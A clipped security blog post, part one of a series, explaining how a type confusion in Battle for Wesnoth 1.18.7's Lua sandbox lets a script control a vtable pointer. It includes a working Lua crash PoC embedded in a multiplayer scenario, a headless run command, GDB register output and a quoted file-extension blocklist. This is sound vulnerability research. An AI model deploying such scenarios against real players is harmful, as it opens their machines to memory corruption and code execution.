---
title: "Escaping Wesnoth's Lua Sandbox: Part 1 — 0day.gg"
source: https://0day.gg/blog/pwning-wesnoth/
source_host: 0day.gg
clip_date: 2026-09-28T18:47:06+08:00
trace_id: 7b30f3b8-616e-4bb1-a1a3-c5c7c6741d12
content_hash: 403dc7e296b0468f425a9a4e754106f0a6814dceea52068a24627b899c41b78b
status: synced
tags:
  - 游戏安全
  - 漏洞分析
series: null
feed_source: 0day.gg·Apple/RE
ai_summary: Wesnoth 的 Lua 沙箱虽移除了文件与系统命令能力，但未保护的 userdata 元表可直接调用 __call 并自选 receiver，造成类型混淆与可控虚表指针。
ai_summary_style: key-points
images_status:
  total: 5
  succeeded: 5
  failed_urls: []
notion_page_id: 3e975244-d011-81bd-85a4-d07a783a97f3
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Wesnoth 的 Lua 沙箱虽移除了文件与系统命令能力，但未保护的 userdata 元表可直接调用 __call 并自选 receiver，造成类型混淆与可控虚表指针。
> 
> - **攻击面：** 多人场景会向加入客户端下发 Lua 代码，Wesnoth 1.18.7 暴露 wesnoth、basic、table、string、math、coroutine、debug、os、utf8 等库，但无 io/package。
> - **沙箱限制：** basic 移除 dofile/loadfile/require；os 仅保留 clock/date/time/difftime，debug 仅保留 traceback/getinfo；文件访问经 canonical_path 与 get_wml_location 限制在用户数据/data 目录，并屏蔽 ..、反斜杠及 .exe/.sh/.js/.ini 等扩展。
> - **漏洞模式：** 元表未设置 __metatable 时可被 getmetatable 取出，直接调用 __call 能自选首参 receiver；回调用 lua_touserdata 无条件强转固定类型，例如 impl_name_generator_call 将 slot 1 转为 name_generator*。
> - **最小 PoC：** 创建 wesnoth.name_generator("markov",...) 后取元表 __call，传入 wesnoth.textdomain(string.rep("A",72)) 作为错误 receiver，触发 gen->generate() 对恶意字节的虚调用。
> - **崩溃结果：** GDB 显示 RAX=0x4141414141414141，对象起始 QWORD 被当作 vtable 指针且完全可控，可伪造 vtable 劫持控制流，Part 2 将实现利用。

Contents [↑ Top](#page-top)

## A Nostalgia Trip

I think one of the most trajectory-altering events of my childhood was getting my very first desktop computer to have all to myself. 300mhz Pentium 2 processor, 256 MB of RAM (!!), which I eventually upgraded to 512 MB. I was ballin’ [(on a budget)](https://www.youtube.com/watch?v=KExcW89csHY).

I also wanted to be a hacker. What do the hackers use? Someone said hackers used Linux. Okay, so I spent a bunch of time learning Linux. What a formative experience, accidentally deleting my bootloader multiple times, and sneakily doing grub recovery at 2:30am on a school night!

I just marveled at the ocean of open source software that was available. As a kid of course, I was preoccupied with games. Xonotic, Warsow, a Guitar Hero clone… Unreal Tournament 2004 even had an official Linux build. Unfortunately, most of the fun ones were too demanding for the hardware I had. But one was just right, a turn-based strategy game called Battle for Wesnoth. I played quite a bit of Wesnoth as a kid. My friends and I were especially fond of the community Colosseum mod, where you’d try to survive against waves of stronger and stronger enemies, buying upgrades each round at the tent in the center of the map.

![wesnoth](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b87aaaf29d1e7dc8.png "Battle for Wesnoth - A Tale of Two Brothers Campaign")

Battle for Wesnoth - A Tale of Two Brothers Campaign

Fast forward a bit, now I’m old. At the very least, I’m not young. I actually do still fire up Wesnoth from time to time, and it’s still great fun. All these years of playing the game, I’d never had the interest to look for bugs in it, until recently during these past few months. I started looking at the latest version available at the time, Wesnoth 1.18.7.

## What’s in the (Sand)box?

Wesnoth has multiplayer, so you can host games and PvP with your friends in 1v1 or group matches. Wesnoth multiplayer maps and modes are created via [Scenarios](https://wiki.wesnoth.org/Buildingscenarios). A Scenario defines, in [WML](https://wiki.wesnoth.org/WML_for_Complete_Beginners:_Introduction) (Wesnoth Markup Language), things like the sides, units involved, special events or triggers. Using the [rich tag set](https://wiki.wesnoth.org/ReferenceWML), there is quite a lot one can do!

When entering a multiplayer match as a participant without the Scenario definition, the user’s game will auto-download the scenario definition directly if it is self-contained, or offer to download the add-on from the designated add-on server when more involved assets are packed in. This means that if an attacker hosts a lobby with a scenario that has any kinds of custom code or assets, this can get served right up to the joining clients. Great attack surface to poke at. [![multiplayer\_connection\_model](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/da0a372b8e7167de.svg)](https://0day.gg/images/multiplayer_connection_model.svg)

There are cases where advanced eventing and map scripting is needed. For this, Wesnoth exposes a customized copy of the Lua scripting engine. This Lua code gets delivered to every joining client when the host starts the match. Naturally, this is a great first place to look for exploitable features. Hopefully we find some quick wins!

Inside, we’ll find a [`wesnoth`](https://wiki.wesnoth.org/LuaAPI/wesnoth) module, which exposes game-specific APIs. Additionally, we find that there are a few familiar [Lua builtins](https://wiki.wesnoth.org/LuaAPI) available, such as `basic`, `coroutine`, `string`, `utf8`, `table`, `math`, `os`, and `debug`. Of course, this is immediately exciting to see as we hunt out attack surface.

```cpp
static const luaL_Reg safe_libs[] {
    { "",       luaopen_base   },
    { "table",  luaopen_table  },
    { "string", luaopen_string },
    { "math",   luaopen_math   },
    { "coroutine",   luaopen_coroutine   },
    { "debug",  luaopen_debug  },
    { "os",     luaopen_os     },
    { "utf8",   luaopen_utf8   },
    // Wesnoth libraries
    { "stringx",lua_stringx::luaW_open },
    { "mathx",  lua_mathx::luaW_open },
    { "wml",    lua_wml::luaW_open },
    { "gui",    lua_gui2::luaW_open },
    { "filesystem", lua_fileops::luaW_open },
    { nullptr, nullptr }
};
```

### Elements Removed

There are, however, some speed bumps which make life more difficult: `basic` has had `dofile`, `loadfile`, and `require` removed. Okay, so no loading arbitrary modules from anywhere. Custom game-safe versions of `dofile` and `require` are exposed under the `wesnoth` module, though.

```cpp
// Delete dofile and loadfile.
lua_pushnil(L);
lua_setglobal(L, "dofile");
lua_pushnil(L);
lua_setglobal(L, "loadfile");

// ... unrelated registrations omitted ...

static luaL_Reg const callbacks[] {
    { "deprecated_message", &intf_deprecated_message },
    { "textdomain",         &lua_common::intf_textdomain },
    { "dofile",             &dispatch<&lua_kernel_base::intf_dofile> },
    { "require",            &dispatch<&lua_kernel_base::intf_require> },
    // ... other Wesnoth APIs omitted ...
    { nullptr, nullptr }
};
```

All of `os` has also been gutted, with the exception of `clock`, `date`, `time`, and `difftime`. `debug` has suffered a similar fate, leaving only only `backtrace` intact. Notably missing from the available modules list is `io`, which would have given us lots of possible file operation primitives, and `package`, which would have exposed native modules. Though, there is a replacement `filesystem` module created which exposes some read-only utilities such as `have_file`, `read_file`, `canonical_path`, `image_size`, `have_asset`, and `resolve_asset`.

```cpp
// Disable functions from os which we don't want.
lua_getglobal(L, "os");
lua_pushnil(L);
while(lua_next(L, -2) != 0) {
    lua_pop(L, 1);
    char const* function = lua_tostring(L, -1);
    if(strcmp(function, "clock") == 0 || strcmp(function, "date") == 0
        || strcmp(function, "time") == 0 || strcmp(function, "difftime") == 0) continue;
    lua_pushnil(L);
    lua_setfield(L, -3, function);
}
lua_pop(L, 1);
```

```cpp
// Disable functions from debug which we don't want.
lua_getglobal(L, "debug");
lua_pushnil(L);
while(lua_next(L, -2) != 0) {
    lua_pop(L, 1);
    char const* function = lua_tostring(L, -1);
    if(strcmp(function, "traceback") == 0 || strcmp(function, "getinfo") == 0) continue;
    lua_pushnil(L);
    lua_setfield(L, -3, function);
}
lua_pop(L, 1);
```

```cpp
static luaL_Reg const callbacks[] {
    { "have_file", &lua_fileops::intf_have_file },
    { "read_file", &lua_fileops::intf_read_file },
    { "canonical_path", &lua_fileops::intf_canonical_path },
    { "image_size", &intf_get_image_size },
    { "have_asset", &intf_have_asset },
    { "resolve_asset", &intf_resolve_asset },
    { nullptr, nullptr }
};
```

### Filesystem Attack Surface

`filesystem.read_file`, `wesnoth.dofile`, and `wesnoth.require` all eventually drain down into `resolve_filename`, which does path normalization and traversal sanitization via `canonical_path`.

```cpp
static bool canonical_path(std::string& filename, const std::string& currentdir)
{
    if(filename.size() < 2) {
        return false;
    }
    if(filename[0] == '.' && filename[1] == '/') {
        filename = currentdir + filename.substr(1);
    }
    if(std::find(filename.begin(), filename.end(), '\\') != filename.end()) {
        return false;
    }

    // ... normalization of /./ and // components omitted ...

    //resolve /../
    while(true) {
        std::size_t pos = filename.find("/..");
        if(pos == std::string::npos) {
            break;
        }
        std::size_t pos2 = filename.find_last_of('/', pos - 1);
        if(pos2 == std::string::npos || pos2 >= pos) {
            return false;
        }
        filename = filename.replace(pos2, pos- pos2 + 3, "");
    }
    if(filename.find("..") != std::string::npos) {
        return false;
    }
    return true;
}

static bool resolve_filename(std::string& filename, const std::string& currentdir, std::string* rel = nullptr)
{
    if(!canonical_path(filename, currentdir)) {
        return false;
    }
    std::string p = filesystem::get_wml_location(filename);
    if(p.empty()) {
        return false;
    }
    if(rel) {
        *rel = filename;
    }
    filename = p;
    return true;
}
```

The request is afterward processed via `get_wml_location`, which confines the target to allowed content roots (User-data tree, the calling file’s current directory, or the `data/` tree).

```cpp
std::string get_wml_location(const std::string& filename, const std::string& current_dir)
{
    if(!is_legal_file(filename)) {
        return std::string();
    }

    assert(game_config::path.empty() == false);

    bfs::path fpath(filename);
    bfs::path result;

    if(filename[0] == '~') {
        result /= get_user_data_path() / "data" / filename.substr(1);
    } else if(*fpath.begin() == ".") {
        if(!current_dir.empty()) {
            result /= bfs::path(current_dir);
        } else {
            result /= bfs::path(game_config::path) / "data";
        }

        result /= filename;
    } else if(!game_config::path.empty()) {
        result /= bfs::path(game_config::path) / "data" / filename;
    }

    if(result.empty() || !file_exists(result)) {
        result.clear();
    }

    return result.string();
}
```

Within `get_wml_location`, `is_legal_file` also does another layer of path syntax rejections, and blocklists a set of file extensions.

```cpp
const blacklist_pattern_list default_blacklist{
    {
        ".+",
        "#*#",
        "*~",
        "*-bak",
        "*.swp",
        "*.pbl",
        "*.ign",
        "_info.cfg",
        "*.exe",
        "*.bat",
        "*.cmd",
        "*.com",
        "*.scr",
        "*.sh",
        "*.js",
        "*.vbs",
        "*.o",
        "*.ini",
        "Thumbs.db",
        "*.wesnoth",
        "*.project",
    },
    {
        ".+",
        "__MACOSX",
    }
};
```

```cpp
static bool is_legal_file(const std::string& filename_str)
{
    if(filename_str.empty()) {
        return false;
    }

    if(filename_str.find("..") != std::string::npos) {
        return false;
    }

    if(filename_str.find('\\') != std::string::npos) {
        return false;
    }

    bfs::path filepath(filename_str);

    if(default_blacklist.match_file(filepath.filename().string())) {
        return false;
    }

    if(std::any_of(filepath.begin(), filepath.end(),
        [](const bfs::path& dirname) { return default_blacklist.match_dir(dirname.string()); })) {
        return false;
    }

    return true;
}
```

This leaves us, generally, with the following (assuming the protections are implemented correctly enough):

-   No arbitrary network operations, as there is no socket module exposed, and native extension loading is not available
-   File operations are quite limited; we can do reads from normal scenario add-on locations, of specific filetypes. Traversal outside doesn’t appear to be viable
-   No direct shell command execution by default, `os` is gutted
-   Can’t easily leak environment variables, for the same reason

Alright, that sucks. Not much in the way of quick wins available. However, scripting engines are roaring fireballs of complexity, marshaling data between the higher level language format and the lower level engine representation.

This delicate dance often results in fields that should be protected being accessible indirectly, protected fields becoming writable due to lifecycle quirks (e.g. during callbacks), type confusions due to duck typing, etc., all typically leading to primitives that enable memory corruption. If you want a taste of these kinds of issues, just take a tour through the CVE history of V8 or JavaScriptCore.

## Claiming a Seat at the Table

Let’s take a look at how low level C++ game APIs and data are bridged upward, allowing one to [call native functions from Lua scripts](https://www.lua.org/pil/26.html). The Lua engine state initialization begins in the `lua_kernel_base::lua_kernel_base()` constructor, where the VM state is initialized.

```cpp
lua_kernel_base::lua_kernel_base()
 : mState(luaL_newstate())
 , cmd_log_()
{
    get_lua_kernel_base_ptr(mState) = this;
    lua_State *L = mState;
```

The current thread’s VM state object itself is referred to by `lua_State *L`. Inside the VM state is a reference to the [stack](https://www.lua.org/pil/24.2.html), as well as pointers to the top and base of the stack.

```c
/*
** 'per thread' state
*/
struct lua_State {
  CommonHeader;
  lu_byte status;
  lu_byte allowhook;
  unsigned short nci;               /* number of items in 'ci' list */
  StkIdRel top;                     /* first free slot in the stack */
  global_State *l_G;
  CallInfo *ci;                     /* call info for current function */
  StkIdRel stack_last;              /* end of stack (last element + 1) */
  StkIdRel stack;                   /* stack base */
  UpVal *openupval;                 /* list of open upvalues in this stack */
  StkIdRel tbclist;                 /* list of to-be-closed variables */
  GCObject *gclist;
  struct lua_State *twups;          /* list of threads with open upvalues */
  struct lua_longjmp *errorJmp;     /* current error recover point */
  CallInfo base_ci;                 /* CallInfo for first level (C calling Lua) */
  volatile lua_Hook hook;
  ptrdiff_t errfunc;                /* current error handling function (stack index) */
  l_uint32 nCcalls;                 /* number of nested (non-yieldable | C)  calls */
  int oldpc;                        /* last pc traced */
  int basehookcount;
  int hookcount;
  volatile l_signalT hookmask;
};
```

![Relationship between lua\_State fields and the Lua value stack](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b5823af054fb8816.svg)

Relationship between lua_State fields and the Lua value stack

Each VM stack slot contains a `StackValue`:

```c
typedef union StackValue {
  TValue val;
  struct {
    TValuefields;
    unsigned short delta;
  } tbclist;
} StackValue;
```

For ordinary stack values, its `val` member is a `TValue` (“tagged value”).

```c
/*
** Union of all Lua values
*/
typedef union Value {
  struct GCObject *gc;    /* collectable objects */
  void *p;         /* light userdata */
  lua_CFunction f; /* light C functions */
  lua_Integer i;   /* integer numbers */
  lua_Number n;    /* float numbers */
  /* not used, but may avoid warnings for uninitialized value */
  lu_byte ub;
} Value;

/*
** Tagged Values. This is the basic representation of values in Lua:
** an actual value plus a tag with its type.
*/
#define TValuefields Value value_; lu_byte tt_

typedef struct TValue {
  TValuefields;
} TValue;
```

These are the native C representations of Lua interpreter object types. If you’ve spent time in other scripting engines such as V8 or JavaScriptCore, this will be conceptually very familiar.

At the payload level, `Value` only needs a handful of native forms to represent the spectrum of Lua value types: a garbage-collected object pointer, raw pointer, C function pointer, integer, or a floating-point number. The accompanying tag tells the VM how to interpret that storage as one of Lua’s richer types, like strings, tables, functions, [userdata](https://www.lua.org/pil/28.1.html), threads, and so on.

Say we have an arbitrary native type, `struct MyType`, that we want to make available to Lua code. We ask Lua to allocate a `userdata` object with enough room to store one `struct MyType`; Lua tracks that allocation for garbage collection. The stack’s `TValue` contains a tagged reference to this userdata, and `lua_touserdata` follows it to return a pointer to the bytes where our `struct MyType` is stored.

![A TValue references a userdata allocation with body storage sized for MyType; native code views those same bytes as a struct with integer fields x and y](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3fa4cf5d7755f71a.svg)

A TValue references a userdata allocation with body storage sized for MyType; native code views those same bytes as a struct with integer fields x and y

The Lua VM can tell that the value is tagged as `userdata`, but not if its body data actually contains a `struct MyType` (or any other inner type, for that matter). That expected concrete inner type identity is generally maintained by the metatable info. `lua_touserdata` only mechanically fetches the body data by dereferencing the right fields.

### Making Userdata Callable

Say our native object stored there is a `Greeter` struct, which stores a greeting intro like `"Hello"`. We want our Lua script to be able to call it like `greeter("Lua")` and get back the result like “Hello, Lua!” Let’s take a look at how we connect those bits together.

First, we’d have to construct a metatable object with a corresponding identifier using `luaL_newmetatable`. A [metatable](https://www.lua.org/manual/5.4/manual.html#2.4) is a table of handlers and fields which respond to special events or call conditions. These ultimately define how an object responds to basic operations, such as property accesses, indexing, and other fun things. e.g. when `==` is used to compare the object to something else, the object’s metatable is consulted for the `__eq()` implementation, which if found is invoked, alongside `__index()` for field lookups and `__newindex` for field assignment, `__call()` when you want your object to be invocable like a function, etc.

One can specify native C++ callbacks and values for these like so:

```cpp
struct Greeter {
    const char* salutation;
    const char* description;
};

// Native callback for __call()
static int call_greeter(lua_State* L)
{
    // Grab argument 1 from the stack, which should be a userdata Value, and cast it to the native Greeter* type. 
    auto* greeter = static_cast<Greeter*>(lua_touserdata(L, 1));

    // Argument 1 is the userdata itself; explicit call parameters begin at index 2.
    const char* name = luaL_optstring(L, 2, "world");
    lua_pushfstring(L, "%s, %s!", greeter->salutation, name);
 
    // returning one lua result, which we pushed to the stack above 
    return 1;
}

// Native callback for __index
static int index_greeter(lua_State* L)
{
    auto* greeter = static_cast<Greeter*>(lua_touserdata(L, 1));
    const char* field = luaL_checkstring(L, 2);

    if(std::strcmp(field, "description") == 0) {
        lua_pushstring(L, greeter->description);
        return 1;
    }

    return 0;
}

// Helper to inject Greeter functionality into the VM
// We'd call this somewhere during VM init to get our stuff
// bootstrapped
static void register_greeter(lua_State* L)
{
    // Allocate the userdata body and initialize its native representation.
    auto* greeter = static_cast<Greeter*>(
        lua_newuserdatauv(L, sizeof(Greeter), 0)
    );
    *greeter = {
        "Hello",
        "A callable userdata object",
    };

    // Construct and attach the userdata's named metatable.
    luaL_newmetatable(L, "greeter_metatable");
    lua_pushcfunction(L, call_greeter);
    // -1 is the callback we just pushed, so -2 will be the metatable beneath it
    lua_setfield(L, -2, "__call");
    lua_pushcfunction(L, index_greeter);
    lua_setfield(L, -2, "__index");
    lua_setmetatable(L, -2);

    // Export the userdata as the global `greeter` inside the interpreter
    lua_setglobal(L, "greeter");
}
```

From which point, a running Lua script could do something like:

```lua
-- Access the description property through the injected global
print(greeter.description)

-- Invoke greeter, triggering the native handler
print(greeter("Lua"))      -- Result: "Hello, Lua!"
```

### Calling Metamethods Directly

When Lua evaluates the `greeter("Lua")` call, the `__call` metatable method is located and invoked. The `greeter` userdata global value gets passed in as the receiver (slot 1), along with the user supplied argument (in slot 2), essentially becoming the following:

```lua
getmetatable(greeter).__call(greeter, "Lua")
```

Yes, there is actually a scripting-side function to get a reference to the metatable methods. So one can just invoke `__call`, `__index`, `__eq`, and the rest directly? Yes! Well, unless the metatable defines a `__metatable` value. In that case, the replacement value is returned instead.

Note that during normal `greeter("Lua")` invocation, the value of the global `greeter` is *implicitly* passed as the receiver, with the caller’s `"Lua"` argument being passed in the second slot. This is why inside `static int call_greeter(lua_State* L)`, we cast stack slot 1 to its userdata form (getting back a `void* p`), which is then cast to `struct Greeter*`:

```cpp
auto* greeter = static_cast<Greeter*>(lua_touserdata(L, 1));
```

Now, hold on a second. During normal usage, unpacking the `userdata` blob in slot 1 to a native type should always go smoothly, as the runtime handles passing the correct receiver value in on behalf of the caller. But if the caller can just invoke `__call` directly through the metatable returned via `getmetatable`, don’t they get to choose the value of the first argument? What happens if I pass in something whose `userdata` payload is actually a different concrete inner type? What happens when that’s cast to `struct Greeter*` and we start calling methods on it, and reading or writing to/from its member values?

Wonderful, [memory-corrupting things!](https://www.youtube.com/watch?v=SIAuhzQqAow)

## A New Challenger Unexpected Receiver Approaches

After spending some brief time spelunking around Lua interpreter internals, we have a potential buggy pattern to explore. To locate variants of this, we need to find places where:

-   An object is injected into the Lua engine, with an unprotected metatable
-   One of those metatable callbacks unconditionally casts the receiver to a fixed type using `lua_touserdata()`
-   The unpacked object is then used for some ✨interesting✨ operation. This might be things like reading or writing to one of its member fields, invoking a virtual method, etc., something to abuse the mismatched representation of the underlying data.

Most of Wesnoth’s Lua setup happens in `src/scripting/lua_kernel_base.cpp`, where the Lua VM state is initialized, with native functions registered in the global `wesnoth` table. This sets up the callbacks such that one can do things like `wesnoth.get_language()` from Lua land.

```cpp
static luaL_Reg const callbacks[] {
    // ...
    { "textdomain",     &lua_common::intf_textdomain },
    // ...
    { "name_generator", &intf_name_generator },
    // ...
    { "log",             &intf_log },
    { "ms_since_init",   &intf_ms_since_init },
    { "get_language",    &intf_get_language },
    { "version",         &intf_make_version },
    { "current_version", &intf_current_version },
    // ...
    { nullptr, nullptr }
};

lua_getglobal(L, "wesnoth");
if (!lua_istable(L,-1)) {
    lua_newtable(L);
}
luaL_setfuncs(L, callbacks, 0);
// ...
lua_setglobal(L, "wesnoth");
```

Some of these callbacks are actually constructors for Lua objects themselves. See how the callback constructs a native object based on the string passed in denoting the type (i.e. `wesnoth.name_generator("markov", ...)`)?

```cpp
static int intf_name_generator(lua_State *L)
{
    std::string type = luaL_checkstring(L, 1);
    name_generator* gen = nullptr;
    try {
        if(type == "markov" || type == "markov_chain") {
            std::vector<std::string> input;
            // ...
            int chain_sz = luaL_optinteger(L, 3, 2);
            int max_len = luaL_optinteger(L, 4, 12);
            gen = new(L) markov_generator(input, chain_sz, max_len);
            // ...
        } else if(type == "context_free" || type == "cfg" || type == "CFG") {
            // ...
        } else {
            return luaL_argerror(L, 1, "should be either 'markov_chain' or 'context_free'");
        }
    }
    catch (const name_generator_invalid_exception& ex) {
        lua_pushstring(L, ex.what());
        return lua_error(L);
    }

    // We set the metatable now, even if the generator is invalid, so that it
    // will be properly collected if it was invalid.
    luaL_getmetatable(L, Gen);
    lua_setmetatable(L, -2);

    return 1;
}
```

Toward the end there you can see it retrieving the metatable via `Gen` (this is just a string identifier) and attaching it to the object. The metatable is actually created here, during engine initialization:

```cpp
cmd_log_ << "Adding name generator metatable...\n";
luaL_newmetatable(L, Gen);
static luaL_Reg const generator[] {
    { "__call", &impl_name_generator_call},
    { "__gc", &impl_name_generator_collect},
    { nullptr, nullptr}
};
luaL_setfuncs(L, generator, 0);
```

And we can see here those magic callback methods being defined for `__call` and `__gc` to handle invocation and garbage collection. Notably, it also doesn’t register a value for `__metatable`, which means we can directly fetch the metatable reference and its native callbacks from Lua land. Let’s peek into the `__call` handler to see what happens when you invoke a name generator function object.

```cpp
static int impl_name_generator_call(lua_State *L)
{
    name_generator* gen = static_cast<name_generator*>(lua_touserdata(L, 1));
    lua_pushstring(L, gen->generate().c_str());
    return 1;
}
```

Hmmm. That looks pretty familiar, doesn’t it? We see here that a userdata pointer is fetched from stack slot 1, immediately cast to a `name_generator*`, and then the `generate()` method is invoked on it. If the attacker can provide a receiver, they can trigger a type confusion here.

### Minimal PoC

This looks pretty close to the buggy pattern we proposed earlier. To reach and trigger this, we just have to call the factory method to create a `name_generator` object, supplying a generation mode and a dummy name input. Then, just invoke `generate` via its `__call` metamethod, supplying a receiver object that’s the wrong type. To supply the bad receiver object, we have to be able to invoke `__call` directly, which we can fetch a reference to via the unprotected metatable we saw earlier. I’m using `textdomain` as the type confused object type here. It’s another userdata object type injected into the VM which is not `name_generator`, meaning it survives the basic `lua_touserdata` conversion call successfully. It’s also conveniently just a dummy null-terminated string container type, so we control all the body bytes and just pass them in via the factory method.

```cpp
int intf_textdomain(lua_State *L)
{
    std::size_t l;
    char const *m = luaL_checklstring(L, 1, &l);

    void *p = lua_newuserdatauv(L, l + 1, 0);
    memcpy(p, m, l + 1);

    luaL_setmetatable(L, gettextKey);
    return 1;
}
```

Anyway, the minimal PoC basically boils down to this:

```lua
local my_generator = wesnoth.name_generator("markov", "pew,pew,pew")
local gen_mt = getmetatable(my_generator)

local badobj = wesnoth.textdomain(string.rep("A", 72))
gen_mt.__call(badobj)
```

### Running the Scenario

To get this to load and run in the typical multiplayer setting, we’ll have to make a barebones scenario, which declares the map, players, and embeds this as an inline `[lua]` block, like so:

```ini
[multiplayer]
    id=invalid_receiver_crash
    name="Invalid name generator receiver"
    map_data="{multiplayer/maps/2p_Aethermaw.map}"
    turns=1

    [side]
        side=1
        controller=ai
        no_leader=yes
    [/side]

    [event]
        name=prestart
        [lua]
            code=<<
local my_generator = wesnoth.name_generator("markov", "pew,pew,pew")
local gen_mt = getmetatable(my_generator)

local badobj = wesnoth.textdomain(string.rep("A", 72))
gen_mt.__call(badobj)
            >>
        [/lua]
    [/event]
[/multiplayer]
```

The scenario can be run conveniently without all the GUI clicking by launching Wesnoth in headless mode with `--nogui` and some suppression options. If you wanted, you could also just drop the map in the configuration directory, and click through the interface to create a game, selecting your custom scenario. It’s all the same.

```shellscript
SDL_VIDEODRIVER=dummy SDL_AUDIODRIVER=dummy \
/target/wesnoth \
   --data-dir /workspace \
   --userdata-dir /tmp/userdata \
   --multiplayer \
   --scenario invalid_receiver_crash \
   --nogui \
   --exit-at-end \
   --turns 1 \
   --controller 1:ai \
   --nomusic \
   --nosound \
   --nocache \
   --no-log-to-file \
   --log-error scripting/lua \
   --log-error engine \
   --log-none audio
```

### Inspecting the Crash

Running it under GDB, we find exactly what we’d hoped for!

```text
Thread 1 received signal SIGSEGV, Segmentation fault.
0x0000ffffb4dff483 in impl_name_generator_call (L=0x2aaab781d238)
    at /build/source/src/scripting/lua_kernel_base.cpp:337
337             lua_pushstring(L, gen->generate().c_str());
(gdb) info registers rax rbx rcx rdx rsi rdi rbp rsp r8 r9 r10 r11 r12 r13 r14 r15 rip eflags
rax            0x4141414141414141  4702111234474983745
rbx            0x2aaab781d238      46912711545400
rcx            0x20                32
rdx            0x2aaac34c57e0      46912909367264
rsi            0x2aaac34c57e0      46912909367264
rdi            0x2aaaab2a54b0      46912504485040
rbp            0x2aaaab2a54b0      0x2aaaab2a54b0
rsp            0x2aaaab2a54b0      0x2aaaab2a54b0
r8             0x2aaab7a79d48      46912714022216
r9             0x0                 0
r10            0x2aaac34b5f40      46912909303616
r11            0x1                 1
r12            0x0                 0
r13            0x2aaab835da40      46912723343936
r14            0x2aaab57a37e0      46912677492704
r15            0xffffb4dff450      281473716319312
rip            0xffffb4dff483      0xffffb4dff483 <impl_name_generator_call(lua_State*)+51>
eflags         0x200202            [ ID IOPL=0 IF ]
```

RAX contains `0x4141414141414141`, the canary value from our type confused `textdomain` object. Recall that the bytes that make up the `textdomain` object in memory are just the `A` ’s we passed into the factory method, followed by a null terminator. When `impl_name_generator_call` goes to unpack the receiver, it gets a `name_generator*` typed view of those bytes.

`generate` is a virtual method, so to invoke it, one must go through the object’s [vtable](https://en.wikipedia.org/wiki/Virtual_method_table). The vtable pointer, the first QWORD of the data, *should* lead to a table of function pointers which can be called to invoke the real implementations of the object’s virtual methods. However here, the vtable pointer is just 0x4141414141414141, fully attacker controlled.

![vtable corruption](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d6181360d3f40cca.svg)

vtable corruption

The struct layout reflects `markov_generator`, as that’s the concrete type of `name_generator` we constructed.

If you’ve done much exploitation before, you know exactly where this is going. We fully control the vtable pointer, meaning if we can create a fake vtable somewhere and stick a useful function pointer in the first slot, we have the ability to call it via this path. Now, what do we call?

Let’s go write a working exploit in [Part 2!](https://0day.gg/blog/pwning-wesnoth-part-2)
